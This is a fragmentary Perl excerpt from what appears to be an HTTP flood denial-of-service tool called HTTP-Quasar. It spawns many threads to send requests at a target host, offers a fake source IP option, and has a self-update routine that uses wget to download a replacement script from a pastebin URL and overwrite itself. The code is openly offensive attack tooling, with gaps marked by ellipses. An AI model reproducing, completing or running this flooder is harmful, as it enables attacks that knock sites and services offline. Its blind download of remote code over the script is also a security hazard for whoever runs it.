...
print color('reset');
    ...
    if($ipfake eq "") {
        ...
        for($v=0;$v<$max;$v++) {
			#print colored(['bright_blue'], '[i]') . " Starting bananeiras " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_pps', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " All threads started!          \r\n";
    }
...
print colored(['bright_blue'], '[i]') . " HTTP-Quasar version -> v" . $myversion . " [Using the latest version]\n";
}
elsif ($actualversion eq "") {
print colored(['bright_blue'], '[i]') . " HTTP-Quasar version -> v" . $myversion . " [Can not connect to servers]\n";
}
else
{
print colored(['bright_red'], '[!]') . " HTTP-Quasar version -> v" . $myversion . " [Using an outdated version (Last is " . $actualversion . ")]\n";
print colored(['bright_blue'], '[i]') . " Downloading the last version...\n";
system("wget https://pastebin.com/raw/zrCSzbDg -O HTTP-Quasar.pl -q");
...
[i] Use: HTTP-Gorila.pl [http://google.com/?q=] [Connections] [Requests per connection] [Method] [Core Mode] [Path Mode] [Initial false IP (13.37)] [Duration]
